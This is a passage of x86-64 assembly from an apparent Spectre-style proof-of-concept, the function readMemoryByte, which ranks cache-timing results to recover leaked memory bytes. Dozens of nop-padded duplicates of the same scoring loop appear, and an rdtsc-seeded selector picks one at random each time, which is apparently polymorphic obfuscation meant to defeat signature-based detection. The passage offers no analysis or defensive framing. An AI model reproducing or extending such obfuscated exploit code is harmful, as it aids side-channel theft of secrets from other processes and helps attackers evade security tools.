	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 96
.LreadMemoryByte_win2_var96:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 97
.LreadMemoryByte_win2_var97:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 98
.LreadMemoryByte_win2_var98:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 99
.LreadMemoryByte_win2_var99:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 100
.LreadMemoryByte_win2_var100:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 101
.LreadMemoryByte_win2_var101:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 102
.LreadMemoryByte_win2_var102:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 103
.LreadMemoryByte_win2_var103:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 104
.LreadMemoryByte_win2_var104:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 105
.LreadMemoryByte_win2_var105:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 106
.LreadMemoryByte_win2_var106:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 107
.LreadMemoryByte_win2_var107:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 108
.LreadMemoryByte_win2_var108:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 109
.LreadMemoryByte_win2_var109:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 110
.LreadMemoryByte_win2_var110:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 111
.LreadMemoryByte_win2_var111:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 112
.LreadMemoryByte_win2_var112:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 113
.LreadMemoryByte_win2_var113:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 114
.LreadMemoryByte_win2_var114:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 115
.LreadMemoryByte_win2_var115:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 116
.LreadMemoryByte_win2_var116:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 117
.LreadMemoryByte_win2_var117:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 118
.LreadMemoryByte_win2_var118:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 119
.LreadMemoryByte_win2_var119:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 120
.LreadMemoryByte_win2_var120:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 121
.LreadMemoryByte_win2_var121:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 122
.LreadMemoryByte_win2_var122:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 123
.LreadMemoryByte_win2_var123:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 124
.LreadMemoryByte_win2_var124:
	popq	%rax
	nop
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 125
.LreadMemoryByte_win2_var125:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 126
.LreadMemoryByte_win2_var126:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 127
.LreadMemoryByte_win2_var127:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 128
.LreadMemoryByte_win2_var128:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 129
.LreadMemoryByte_win2_var129:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 130
.LreadMemoryByte_win2_var130:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 131
.LreadMemoryByte_win2_var131:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 132
.LreadMemoryByte_win2_var132:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 133
.LreadMemoryByte_win2_var133:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 134
.LreadMemoryByte_win2_var134:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 135
.LreadMemoryByte_win2_var135:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 136
.LreadMemoryByte_win2_var136:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 137
.LreadMemoryByte_win2_var137:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 138
.LreadMemoryByte_win2_var138:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 139
.LreadMemoryByte_win2_var139:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 140
.LreadMemoryByte_win2_var140:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 141
.LreadMemoryByte_win2_var141:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 142
.LreadMemoryByte_win2_var142:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 143
.LreadMemoryByte_win2_var143:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win2_continue
## Variant 144
.LreadMemoryByte_win2_var144:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 145
.LreadMemoryByte_win2_var145:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 146
.LreadMemoryByte_win2_var146:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
	nop
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
	nop
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 147
.LreadMemoryByte_win2_var147:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 148
.LreadMemoryByte_win2_var148:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	jmp	.LreadMemoryByte_win2_continue
## Variant 149
.LreadMemoryByte_win2_var149:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_36
## %bb.27:                              ##   in Loop: Header=BB1_26 Depth=2
	cmpl	$0, -60(%rbp)
	jl	LBB1_29
## %bb.28:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	jmp	.LreadMemoryByte_win2_continue
.LreadMemoryByte_win2_continue:
	movl	(%rax,%rcx,4), %eax
	movslq	-60(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	cmpl	(%rcx,%rdx,4), %eax
	jl	LBB1_30
LBB1_29:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-60(%rbp), %eax
	movl	%eax, -64(%rbp)
	movl	-56(%rbp), %eax
	movl	%eax, -60(%rbp)
	jmp	LBB1_34
LBB1_30:                                ##   in Loop: Header=BB1_26 Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win1_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win1_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win1_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win1_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win1_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win1_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win1_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win1_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win1_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win1_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win1_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win1_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win1_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win1_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win1_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win1_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win1_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win1_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win1_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win1_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win1_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win1_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win1_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win1_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win1_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win1_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win1_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win1_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win1_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win1_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win1_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win1_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win1_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win1_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win1_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win1_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win1_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win1_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win1_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win1_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win1_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win1_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win1_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win1_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win1_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win1_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win1_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win1_var47
